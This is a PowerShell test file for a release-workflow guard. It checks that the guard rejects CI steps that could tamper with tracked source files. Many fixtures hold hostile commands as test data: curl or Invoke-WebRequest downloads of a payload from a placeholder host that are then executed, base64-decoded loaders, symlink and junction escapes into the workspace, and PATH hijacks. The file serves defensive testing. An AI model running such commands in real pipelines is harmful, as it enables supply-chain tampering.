        @{ Name = 'qualified GNU gtimeout runs downloaded script that writes tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; /opt/homebrew/bin/gtimeout -k 1 -s TERM -- 2 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md'); Shell = 'bash' },
        @{ Name = 'qualified GNU gtimeout runs downloaded script that writes nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; env -S ''/usr/local/bin/gtimeout --kill-after=1 -- 2 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md'''); Shell = 'bash' },
        @{ Name = 'downloaded PowerShell executable writes tracked root'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP\rewrite.exe"; & "$env:RUNNER_TEMP\rewrite.exe" CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'downloaded PowerShell executable writes nested tracked source'; Text = 'Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP\rewrite.exe"; & "$env:RUNNER_TEMP\rewrite.exe" src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'downloaded executable writes tracked root after runner-temp directory change'; Text = 'curl --output "$RUNNER_TEMP/rewrite" https://host/payload; chmod +x "$RUNNER_TEMP/rewrite"; cd "$RUNNER_TEMP"; ./rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'downloaded executable writes nested source after runner-temp directory change'; Text = 'curl --output "$RUNNER_TEMP/rewrite" https://host/payload; chmod +x "$RUNNER_TEMP/rewrite"; cd "$RUNNER_TEMP"; ./rewrite src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'runner-temp executable on Bash PATH writes tracked root'; Text = 'curl --output "$RUNNER_TEMP/rewrite" https://host/payload; chmod +x "$RUNNER_TEMP/rewrite"; export PATH="$RUNNER_TEMP:$PATH"; rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'runner-temp executable through env PATH writes tracked root'; Text = 'curl --output "$RUNNER_TEMP/rewrite" https://host/payload; chmod +x "$RUNNER_TEMP/rewrite"; env PATH="$RUNNER_TEMP:$PATH" rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'runner-temp executable on PowerShell PATH writes nested source'; Text = '$env:PATH = "$env:RUNNER_TEMP;$env:PATH"; rewrite.exe src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'runner-temp executable through Set-Item PATH writes nested source'; Text = 'Set-Item Env:PATH "$env:RUNNER_TEMP;$env:PATH"; rewrite.exe src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'pwsh' },
        @{ Name = 'runner-temp executable through New-Item PATH writes tracked root'; Text = 'New-Item Env:PATH -Value "$env:RUNNER_TEMP;$env:PATH"; rewrite.exe CHANGELOG.md'; Shell = 'pwsh' },
        @{ Name = 'conditional Set-Item PATH exposes runner-temp executable'; Text = 'if ($true) { Set-Item Env:PATH "$env:RUNNER_TEMP;$env:PATH"; rewrite.exe CHANGELOG.md }'; Shell = 'pwsh' }
    )
    foreach ($case in $directExecutableWriterCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $runStep = @{ Name = $case.Name; Text = $case.Text; Shell = $case.Shell }
            $fixtureArguments = @{ ScriptPath = $script }
            if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = @($runStep) }
            elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($runStep) }
            else { $fixtureArguments.SecondInvocation = $true; $fixtureArguments.RunsBetweenInvocations = @($runStep) }
            $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'downloaded-executable-writer.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position." }
        }
    }

    $timeoutWrappedTrackedWriterCases = @(
        @{ Name = 'timeout-wrapped downloaded script can write tracked root'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md') },
        @{ Name = 'timeout-wrapped downloaded script can write nested tracked source'; Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" src/KeelMatrix.PackageSurface.Cli/README.md') }
    )
    $shellRestoreCommands = @(
        'git checkout --detach ''${{ github.sha }}''',
        'git switch --detach ''${{ github.sha }}'''
    )
    foreach ($case in $timeoutWrappedTrackedWriterCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            foreach ($restoreCommand in $shellRestoreCommands) {
                $runSteps = @(
                    @{ Name = $case.Name; Text = $case.Text; Shell = 'bash' },
                    @{ Name = 'Attempt shell checkout or switch restoration'; Text = $restoreCommand; Shell = 'bash' }
                )
                $fixtureArguments = @{ ScriptPath = $script }
                if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = $runSteps }
                elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = $runSteps }
                else { $fixtureArguments.SecondInvocation = $true; $fixtureArguments.RunsBetweenInvocations = $runSteps }
                $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
                $rejected = $false
                try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'timeout-wrapped-direct-writer.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
                catch { $rejected = $true }
                if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position despite a shell checkout or switch." }
            }
        }
    }

    $timeoutActionRestoreWriter = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md')
    $timeoutActionRestoreFixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $timeoutActionRestoreWriter -WriteText 'printf payload' -Shell 'bash' -Position 'after artifact download' -IncludeShellCheckout
    $timeoutActionRestoreResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'timeout-wrapped-action-restore.yml'; Text = $timeoutActionRestoreFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('timeout-wrapped-action-restore.yml/future-consumer'))
    if ($timeoutActionRestoreResult.Count -ne 1 -or $timeoutActionRestoreResult[0].Scripts -notcontains $script) {
        throw 'A clean unconditional root action checkout must restore tracked bytes after a timeout-wrapped downloaded writer.'
    }

    $gtimeoutActionRestoreWriter = ('curl --output "' + $workflowRunnerTemp + '/rewrite.sh" https://host/payload; gtimeout -- 1 bash "' + $workflowRunnerTemp + '/rewrite.sh" CHANGELOG.md')
    $gtimeoutActionRestoreFixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $gtimeoutActionRestoreWriter -WriteText 'printf payload' -Shell 'bash' -Position 'after artifact download' -IncludeShellCheckout
    $gtimeoutActionRestoreResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'gtimeout-action-restore.yml'; Text = $gtimeoutActionRestoreFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('gtimeout-action-restore.yml/future-consumer'))
    if ($gtimeoutActionRestoreResult.Count -ne 1 -or $gtimeoutActionRestoreResult[0].Scripts -notcontains $script) {
        throw 'A clean unconditional root action checkout must restore tracked bytes after a GNU gtimeout-wrapped downloaded writer.'
    }

    $directExecutableLinkCases = @(
        @{
            Name = 'downloaded executable can link the tracked root'
            Link = ('curl --output "' + $workflowRunnerTemp + '/prepare" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/prepare"; "' + $workflowRunnerTemp + '/prepare" "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"')
            Write = ('curl --output "' + $workflowRunnerTemp + '/escape/CHANGELOG.md" https://host/payload')
            Shell = 'bash'
        },
        @{
            Name = 'downloaded executable can link a nested tracked directory'
            Link = ('curl --output "' + $workflowRunnerTemp + '/prepare" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/prepare"; "' + $workflowRunnerTemp + '/prepare" "$GITHUB_WORKSPACE/src/KeelMatrix.PackageSurface.Cli" "$RUNNER_TEMP/escape"')
            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"')
            Shell = 'bash'
        },
        @{
            Name = 'downloaded PowerShell helper can link the tracked root'
            Link = ('Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP\prepare"; & "$env:RUNNER_TEMP\prepare" "$env:GITHUB_WORKSPACE" "$env:RUNNER_TEMP\escape"')
            Write = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\escape\CHANGELOG.md"')
            Shell = 'pwsh'
        },
        @{
            Name = 'downloaded PowerShell helper can link a nested tracked directory'
            Link = ('Invoke-WebRequest -Uri https://host/payload -OutFile "$env:RUNNER_TEMP\prepare"; & "$env:RUNNER_TEMP\prepare" "$env:GITHUB_WORKSPACE\src\KeelMatrix.PackageSurface.Cli" "$env:RUNNER_TEMP\escape"')
            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"')
            Shell = 'pwsh'
        }
    )
    foreach ($case in $directExecutableLinkCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $case.Link -WriteText $case.Write -Shell $case.Shell -Position $position -IncludeShellCheckout
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'downloaded-executable-link.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position after a pinned checkout and artifact download." }
        }
    }

    $bashVariableExecutableWriterCases = @(
        @{
            Name = 'downloaded Bash helper in quoted variable writes tracked root'
            Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/rewrite"; helper="' + $workflowRunnerTemp + '/rewrite"; "$helper" CHANGELOG.md')
        },
        @{
            Name = 'downloaded Bash helper in braced variable writes nested tracked source'
            Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/rewrite"; helper="' + $workflowRunnerTemp + '/rewrite"; ' + $helperExpansion + ' src/KeelMatrix.PackageSurface.Cli/README.md')
        },
        @{
            Name = 'downloaded Bash helper reached through env wrapper writes tracked root'
            Text = ('curl --output "' + $workflowRunnerTemp + '/rewrite" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/rewrite"; helper="' + $workflowRunnerTemp + '/rewrite"; env -- "$helper" CHANGELOG.md')
        }
    )
    foreach ($case in $bashVariableExecutableWriterCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $runStep = @{ Name = $case.Name; Text = $case.Text; Shell = 'bash' }
            $fixtureArguments = @{ ScriptPath = $script }
            if ($position -eq 'before artifact download') { $fixtureArguments.RunsBeforeDownload = @($runStep) }
            elseif ($position -eq 'after artifact download') { $fixtureArguments.RunsAfterDownload = @($runStep) }
            else { $fixtureArguments.SecondInvocation = $true; $fixtureArguments.RunsBetweenInvocations = @($runStep) }
            $fixture = New-WorkflowGitScriptConsumerFixture @fixtureArguments
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'bash-variable-runner-temp-writer.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position before the next guarded script invocation." }
        }
    }
    foreach ($restoreText in @(
        ('git checkout --detach ''' + [char]36 + '{{ github.sha }}' + ''''),
        ('git switch --detach ''' + [char]36 + '{{ github.sha }}' + '''')
    )) {
        $helperStep = @{ Name = 'Run a downloaded Bash helper from a variable'; Text = $bashVariableExecutableWriterCases[0].Text; Shell = 'bash' }
        $restoreStep = @{ Name = 'Attempt pinned shell restoration'; Text = $restoreText; Shell = 'bash' }
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @($helperStep, $restoreStep)
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'bash-variable-shell-restore.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw 'A pinned shell checkout or switch falsely restored source after a variable-invoked Bash helper.' }
    }
    $actionRestoreFixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $bashVariableExecutableWriterCases[0].Text -WriteText 'printf payload' -Shell 'bash' -Position 'after artifact download'
    $actionRestoreResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'bash-variable-action-restore.yml'; Text = $actionRestoreFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('bash-variable-action-restore.yml/future-consumer'))
    if ($actionRestoreResult.Count -ne 1 -or $actionRestoreResult[0].Scripts -notcontains $script) {
        throw 'A clean unconditional root action checkout must restore direct tracked writes from a variable-invoked helper.'
    }

    $bashVariableExecutableLinkCases = @(
        @{
            Name = 'downloaded Bash helper in variable creates root link'
            Text = ('curl --output "' + $workflowRunnerTemp + '/prepare" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/prepare"; helper="' + $workflowRunnerTemp + '/prepare"; "$helper" "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"');
            Write = ('curl --output "' + $workflowRunnerTemp + '/escape/CHANGELOG.md" https://host/payload')
        },
        @{
            Name = 'downloaded Bash helper in variable creates nested link'
            Text = ('curl --output "' + $workflowRunnerTemp + '/prepare" https://host/payload; chmod +x "' + $workflowRunnerTemp + '/prepare"; helper="' + $workflowRunnerTemp + '/prepare"; ' + $helperExpansion + ' "$GITHUB_WORKSPACE/src/KeelMatrix.PackageSurface.Cli" "$RUNNER_TEMP/escape"');
            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"')
        }
    )
    foreach ($case in $bashVariableExecutableLinkCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $case.Text -WriteText $case.Write -Shell 'bash' -Position $position -IncludeShellCheckout
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'bash-variable-runner-temp-executable.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position around shell and action checkout ordering." }
        }
    }

    $timeoutWrappedScriptLinkCases = @(
        @{
            Name = 'timeout end-of-options runs downloaded script that links the tracked root'
            Link = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/prepare.sh" "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"')
            Write = ('curl --output "' + $workflowRunnerTemp + '/escape/CHANGELOG.md" https://host/payload')
        },
        @{
            Name = 'timeout end-of-options runs downloaded script that links a nested tracked directory'
            Link = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; timeout -- 1 bash "' + $workflowRunnerTemp + '/prepare.sh" "$GITHUB_WORKSPACE/src/KeelMatrix.PackageSurface.Cli" "$RUNNER_TEMP/escape"')
            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"')
        }
    )
    foreach ($case in $timeoutWrappedScriptLinkCases) {
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $case.Link -WriteText $case.Write -Shell 'bash' -Position $position -IncludeShellCheckout
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'timeout-wrapped-runner-temp-link.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) $position around shell and action checkout ordering." }
        }
    }

    $bashForwardSlashScriptFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'Invoke tracked Bash script with portable separators'; Text = 'bash ./scripts/validate-release-artifact-set.ps1'; Shell = 'bash' }
    )
    $bashForwardSlashScriptResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'bash-forward-slash-script.yml'; Text = $bashForwardSlashScriptFixture }) -RepositoryRoot $RepositoryRoot)
    if ($bashForwardSlashScriptResult.Count -ne 1) { throw 'A tracked script path with forward slashes must remain valid in Bash.' }
    foreach ($bashPath in @('bash ./scripts\validate-release-artifact-set.ps1', 'bash ''./scripts\validate-release-artifact-set.ps1''')) {
        $fixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
            @{ Name = 'Invoke a Bash script path containing backslashes'; Text = $bashPath; Shell = 'bash' }
        )
        $rejected = $false
        try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'bash-backslash-script.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
        catch { $rejected = $true }
        if (-not $rejected) { throw "Bash script path '$bashPath' was normalized as a Windows path." }
    }

    $hiddenRunnerTempLoaders = @(
        @{ Name = 'Bash dot-source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; . "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
        @{ Name = 'Bash source helper can create a tracked-path link'; Text = ('curl --output "' + $workflowRunnerTemp + '/prepare.sh" https://host/payload; source "' + $workflowRunnerTemp + '/prepare.sh"'); Shell = 'bash' },
        @{ Name = 'PowerShell dot-source helper can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; . ' + $workflowRunnerTemp + '\prepare.ps1'); Shell = 'pwsh' },
        @{ Name = 'PowerShell -File helper can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh -File "' + $workflowRunnerTemp + '\prepare.ps1"'); Shell = 'pwsh' },
        @{ Name = 'Unquoted PowerShell executable helper invocation can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; pwsh $env:RUNNER_TEMP\prepare.ps1'); Shell = 'pwsh' },
        @{ Name = 'Unquoted PowerShell command helper invocation can create a tracked-path link'; Text = ('Invoke-WebRequest -Uri https://host/payload -OutFile "' + $workflowRunnerTemp + '\prepare.ps1"; $env:RUNNER_TEMP\prepare.ps1'); Shell = 'pwsh' }
    )
    $hiddenLinkTargets = @(
        @{ Name = 'tracked root'; Write = ('curl --output "' + $workflowRunnerTemp + '/escape/CHANGELOG.md" https://host/payload') },
        @{ Name = 'nested tracked path'; Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"') }
    )
    foreach ($loader in $hiddenRunnerTempLoaders) {
        foreach ($target in $hiddenLinkTargets) {
            foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
                $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $loader.Text -WriteText $target.Write -Shell $loader.Shell -Position $position
                $rejected = $false
                try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'hidden-runner-temp-link.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
                catch { $rejected = $true }
                if (-not $rejected) { throw "Workflow contract accepted $($loader.Name) targeting a $($target.Name) $position, despite a later pinned checkout." }
            }
        }
    }

    $hiddenPathLinkCases = @(
        @{
            Name = 'Bash script creates a link to the tracked root'
            Shell = 'bash'
            Payload = 'ln -s "$GITHUB_WORKSPACE" "$RUNNER_TEMP/escape"'
            Write = ('curl --output "' + $workflowRunnerTemp + '/escape/CHANGELOG.md" https://host/payload')
        },
        @{
            Name = 'Bash script creates a link to a nested tracked directory'
            Shell = 'bash'
            Payload = 'ln -s "$GITHUB_WORKSPACE/src/KeelMatrix.PackageSurface.Cli" "$RUNNER_TEMP/escape"'
            Write = ('curl --output "' + $workflowRunnerTemp + '/escape/README.md" https://host/payload')
        },
        @{
            Name = 'PowerShell script creates a junction to the tracked root'
            Shell = 'pwsh'
            Payload = 'New-Item -ItemType Junction -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE"'
            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\CHANGELOG.md"')
        },
        @{
            Name = 'PowerShell script creates a junction to a nested tracked directory'
            Shell = 'pwsh'
            Payload = 'New-Item -ItemType Junction -Path "$env:RUNNER_TEMP\escape" -Target "$env:GITHUB_WORKSPACE\src\KeelMatrix.PackageSurface.Cli"'
            Write = ('Copy-Item source "' + $workflowRunnerTemp + '\escape\README.md"')
        }
    )
    foreach ($case in $hiddenPathLinkCases) {
        $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($case.Payload))
        if ($case.Shell -eq 'bash') {
            $linkLoader = ("printf '%s' '" + $encodedPayload + "' | base64 -d > '" + $workflowRunnerTemp + "/prepare.sh'; bash '" + $workflowRunnerTemp + "/prepare.sh'")
        }
        else {
            $linkLoader = ('[IO.File]::WriteAllBytes("' + $workflowRunnerTemp + '\prepare.ps1", [Convert]::FromBase64String(''' + $encodedPayload + ''')); pwsh -File "' + $workflowRunnerTemp + '\prepare.ps1"')
        }
        foreach ($position in @('before artifact download', 'after artifact download', 'between guarded invocations')) {
            $fixture = New-WorkflowRunnerTempRedirectFixture -ScriptPath $script -LinkText $linkLoader -WriteText $case.Write -Shell $case.Shell -Position $position -IncludeShellCheckout
            $rejected = $false
            try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'hidden-path-link.yml'; Text = $fixture }) -RepositoryRoot $RepositoryRoot }
            catch { $rejected = $true }
            if (-not $rejected) { throw "Workflow contract accepted $($case.Name) followed by a tracked write $position, despite a later pinned checkout." }
        }
    }

    $staticWindowsScriptFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'Invoke tracked script with Windows separators'; Text = 'pwsh -NoLogo -NoProfile -File .\scripts\validate-release-artifact-set.ps1'; Shell = 'pwsh' }
    )
    $staticWindowsScriptResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'static-windows-script.yml'; Text = $staticWindowsScriptFixture }) -RepositoryRoot $RepositoryRoot)
    if ($staticWindowsScriptResult.Count -ne 1 -or $staticWindowsScriptResult[0].Scripts -notcontains $script) { throw 'A tracked PowerShell script with static Windows path separators must preserve pinned source.' }

    $sameStepCommandChain = New-WorkflowGitScriptConsumerFixture -ScriptPath $script
    $scriptCommand = '          pwsh -NoLogo -NoProfile -File ./' + $script
    $sameStepCommandChain = $sameStepCommandChain.Replace($scriptCommand, '          git fetch origin main; git checkout FETCH_HEAD' + [Environment]::NewLine + $scriptCommand)
    $sameStepRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'same-step-source-mutation.yml'; Text = $sameStepCommandChain }) -RepositoryRoot $RepositoryRoot }
    catch { $sameStepRejected = $true }
    if (-not $sameStepRejected) { throw 'A source-changing Git chain in the same run step as a tracked script invocation must be rejected.' }

    $safeGitFixture = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'Read source status'; Text = 'git status --short' },
        @{ Name = 'Read source diff'; Text = 'git diff --quiet' }
    )
    $safeGitResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'safe-git.yml'; Text = $safeGitFixture }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('safe-git.yml/future-consumer'))
    if ($safeGitResult.Count -ne 1 -or $safeGitResult[0].Scripts -notcontains $script) { throw 'Read-only Git status and diff commands must preserve the pinned source state.' }

    $shellPinnedBeforeDownload = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsBeforeDownload @(
        @{ Name = 'Keep pinned source'; Text = 'git checkout --detach ''${{ github.sha }}''' }
    )
    $shellPinnedBeforeResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'pinned-before-download.yml'; Text = $shellPinnedBeforeDownload }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('pinned-before-download.yml/future-consumer'))
    if ($shellPinnedBeforeResult.Count -ne 1 -or $shellPinnedBeforeResult[0].Scripts -notcontains $script) { throw 'A pinned shell checkout must preserve already-valid source before artifact download.' }

    $shellPinnedAfterDownload = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'Keep pinned source'; Text = 'git -C "$GITHUB_WORKSPACE" switch --detach $GITHUB_SHA'; Shell = 'bash' }
    )
    $shellPinnedAfterResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'pinned-after-download.yml'; Text = $shellPinnedAfterDownload }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('pinned-after-download.yml/future-consumer'))
    if ($shellPinnedAfterResult.Count -ne 1 -or $shellPinnedAfterResult[0].Scripts -notcontains $script) { throw 'A pinned shell switch must preserve already-valid source after artifact download.' }

    $conditionalSameSource = New-WorkflowGitScriptConsumerFixture -ScriptPath $script -RunsAfterDownload @(
        @{ Name = 'Conditional pinned source'; If = $true; Text = 'git checkout --detach ''${{ github.sha }}''' }
    )
    $conditionalSameSourceResult = @(Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'conditional-same-source.yml'; Text = $conditionalSameSource }) -RepositoryRoot $RepositoryRoot -RequiredConsumerNames @('conditional-same-source.yml/future-consumer'))
    if ($conditionalSameSourceResult.Count -ne 1 -or $conditionalSameSourceResult[0].Scripts -notcontains $script) { throw 'A conditional checkout to the already-pinned source must preserve, but never establish, the valid source state.' }

    $unsupportedFlow = "jobs:`n  future-consumer:`n    steps: []`n"
    $unsupportedRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'unsupported.yml'; Text = $unsupportedFlow }) -RepositoryRoot $RepositoryRoot }
    catch { $unsupportedRejected = $true }
    if (-not $unsupportedRejected) { throw 'Workflow guard must fail closed on unsupported flow-style steps.' }
    $unsupportedAlias = "jobs:`n  future-consumer:`n    steps:`n      - *shared-step`n"
    $unsupportedRejected = $false
    try { $null = Invoke-ReleaseWorkflowScriptSourceGuard -Workflows @(@{ Name = 'unsupported-alias.yml'; Text = $unsupportedAlias }) -RepositoryRoot $RepositoryRoot }
    catch { $unsupportedRejected = $true }
    if (-not $unsupportedRejected) { throw 'Workflow guard must fail closed on unsupported step aliases.' }

    # Artifact payloads are data until the workflow selects an artifact path as an
    # executable, interpreter input, or PATH entry. Keep these static fixtures
    # non-executing; the argument names stand in for root and nested tracked files.
    $artifactExecutableCases = @(
        @{ Name = 'artifact gtimeout wrapper writes root'; Path = 'artifacts'; Text = './artifacts/gtimeout -- 1 rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'artifact timeout wrapper writes nested source'; Path = 'artifacts'; Text = './artifacts/timeout -- 1 rewrite src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'artifact env wrapper writes root'; Path = 'artifacts'; Text = './artifacts/env -- rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'artifact exec wrapper writes nested source'; Path = 'artifacts'; Text = './artifacts/exec -a alias rewrite src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'artifact time wrapper writes root'; Path = 'artifacts'; Text = './artifacts/time -f %e rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'artifact Bash executable writes nested source'; Path = 'artifacts'; Text = './artifacts/bash --version src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'trusted Bash interpreter loads artifact script'; Path = 'artifacts'; Text = 'bash ./artifacts/rewrite.sh CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'relative artifact executable resolves from nested working directory'; Path = 'artifacts'; Text = '../../artifacts/rewrite src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash'; WorkingDirectory = 'src/KeelMatrix.PackageSurface.Cli' },
        @{ Name = 'absolute artifact script loaded by trusted Bash'; Path = '/tmp/release-helper'; Text = 'bash /tmp/release-helper/rewrite.sh src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'artifact helper with unknown name writes root'; Path = 'artifacts'; Text = './artifacts/rewrite CHANGELOG.md'; Shell = 'bash' },
        @{ Name = 'absolute artifact helper with unknown name writes nested source'; Path = '/tmp/release-helper'; Text = '/tmp/release-helper/rewrite src/KeelMatrix.PackageSurface.Cli/README.md'; Shell = 'bash' },
        @{ Name = 'absolute artifact gtimeout wrapper writes root'; Path = '/tmp/release-helper'; Text = '/tmp/release-helper/gtimeout -- 1 rewrite CHANGELOG.md'; Shell = 'bash' }
    )
    foreach ($case in $artifactExecutableCases) {
        foreach ($position in @('after artifact download', 'between guarded invocations')) {
